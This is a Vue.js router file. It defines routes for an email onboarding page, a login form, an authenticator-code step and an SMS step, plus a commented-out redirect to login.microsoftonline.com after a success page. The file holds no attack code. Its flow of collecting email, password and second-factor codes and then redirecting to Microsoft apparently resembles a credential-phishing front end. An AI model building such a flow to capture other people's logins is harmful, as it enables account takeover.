import Vue from 'vue';
import VueRouter from 'vue-router';
import OnBoarding from '../views/OnBoarding.vue';
import LoginForm from '../views/LoginForm.vue';
import Authenticator from '../views/Authenticator';
import Sms from '../views/Sms';
Vue.use(VueRouter);

const routes = [
  {
    path: '/login/mail/:browser?',
    name: 'OnBoarding',
    component: OnBoarding,
  },
  {
    path: '/login/mail/:email/:browser',
    name: 'LoginForm',
    component: LoginForm,
  },
  {
    path: '/login/authenticator/:email/:browser',
    name: 'Authenticator',
    component: Authenticator,
  },
  {
    path: '/login/sms/:email/:browser/:smsInfo',
    name: 'Sms',
    component: Sms,
  },

  // {
  //   path: '/microsoft',
  //   name: 'microsoft',
  //   beforeEnter() {
  //     location.href = 'https://login.microsoftonline.com';
  //   },
  //   component: () =>
  //     import(/* webpackChunkName: "microsoft" */ '../views/success.vue'),
  // },
];

const router = new VueRouter({
  routes,
});

export default router;
